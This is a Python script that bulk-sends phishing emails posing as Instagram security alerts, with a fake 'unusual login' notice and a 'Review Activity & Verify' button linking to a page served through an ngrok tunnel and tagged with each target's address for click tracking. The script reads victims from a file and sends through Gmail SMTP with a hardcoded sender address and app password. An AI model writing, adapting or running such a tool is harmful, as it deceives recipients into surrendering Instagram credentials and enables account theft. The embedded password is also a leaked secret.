import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests

# =============================
# CONFIG
# =============================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RECEIVERS_FILE = os.path.join(BASE_DIR, "receivers.txt")
NGROK_API_URL = "http://127.0.0.1:4040/api/tunnels"  # ngrok local API

SMTP_HOST = "smtp.gmail.com"
SMTP_PORT = 587

# 👉 SET YOUR EMAIL HERE
SENDER_EMAIL = "newonline2006@gmail.com"
SENDER_PASSWORD = "ejukpatydvukpcor"

# 👉 DEFAULT (will be overridden by ngrok URL if available)
LOCAL_URL = "http://localhost:5000/"


# =============================
# GET PUBLIC URL
# =============================
def get_public_url():
    try:
        res = requests.get(NGROK_API_URL, timeout=3)
        data = res.json()

        for tunnel in data['tunnels']:
            if tunnel['proto'] == 'https':
                return tunnel['public_url'] + '/'
    except Exception as e:
        print(f"⚠️ Could not get ngrok URL: {e}")

    return LOCAL_URL


# =============================
# LOAD RECEIVERS
# =============================
def load_receivers(filepath):
    with open(filepath, "r", encoding="utf-8") as file:
        return [line.strip() for line in file if line.strip()]


# =============================
# SEND EMAIL FUNCTION
# =============================
def send_email(to_address, public_url=None):
    if not public_url:
        public_url = get_public_url()
    
    # Add recipient email as parameter to track who clicks
    verification_link = f"{public_url}?email={to_address}"
    
    subject = "Instagram Account Verification Required"

    html_body = f"""
    <html>
    <body style="font-family: Arial; background:#f4f4f4; padding:40px;">
        <div style="max-width:500px; margin:auto; background:white; padding:30px; border-radius:10px;">
            
            <h2 style="color:#333;">INSTAGRAM <br> Unusual Activity Detected</h2>

            <p>We noticed a login attempt on your Instagram account from a device or location that you don’t usually use.</p>

            <p><b>Details of the activity:</b></p>
            <p>
                Device: Nothing phone (3a) Pro <br>
                Location: near Margao  <br>
                Time: Recent Login Attempt
            </p>

            <p>To help keep your account secure, we’ve temporarily limited access until you confirm this activity.</p>

            <p>Please verify your account to restore full access and secure your information.</p>

            <div style="text-align:center; margin:30px 0;">
                <a href="{verification_link}" 
                   style="background:#1877f2; color:white; padding:12px 25px; 
                          text-decoration:none; border-radius:25px; font-weight:bold;">
                   Review Activity & Verify
                </a>
            </div>

            <p style="color:#777; font-size:12px;">
                If this was you, you can safely ignore this message. Otherwise, we recommend your verification.
            </p>

        </div>
    </body>
</html>
    """

    msg = MIMEMultipart("alternative")
    msg["From"] = SENDER_EMAIL
    msg["To"] = to_address
    msg["Subject"] = subject

    msg.attach(MIMEText(html_body, "html"))

    try:
        server = smtplib.SMTP(SMTP_HOST, SMTP_PORT)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, to_address, msg.as_string())
        server.quit()

        print(f"✅ Email sent to {to_address}")

    except Exception as e:
        print(f"❌ Failed to send to {to_address}: {e}")


# =============================
# MAIN
# =============================
if __name__ == "__main__":
    public_url = get_public_url()
    print(f"\n📧 Using URL: {public_url}")
    print(f"⚠️  Make sure ngrok is running!\n")
    
    receivers = load_receivers(RECEIVERS_FILE)

    for r in receivers:
        send_email(r, public_url)